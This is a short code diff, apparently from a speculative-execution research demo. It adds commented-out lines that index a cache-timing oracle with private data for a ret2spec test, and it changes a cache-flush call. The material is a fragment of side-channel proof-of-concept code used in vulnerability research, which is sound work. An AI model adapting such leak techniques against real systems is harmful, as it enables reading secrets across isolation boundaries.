@@ -76,6 +76,12 @@ static bool ReturnsTrue(int counter) {
 static int cond = 0;
 
 void baz() {
+  // This is copied here just to make sure speculation works.
+  // For testing ret2spec, comment this out.  
+  // const std::array<BigByte, 256> &oracle = *oracle_ptr;
+  //   ForceRead(oracle.data() +
+  //     static_cast<unsigned char>(private_data[current_offset]));
+
   // mfence and lfence, closing speculation window
   MemoryAndSpeculationBarrier();
   while (true) {}
@@ -103,7 +109,7 @@ bool bar() {
     return true;
   }
 
-  FlushDataCacheLineNoBarrier(ptr + 20);
+  FlushDataCacheLine(ptr + 20);
   return false;
 }
 
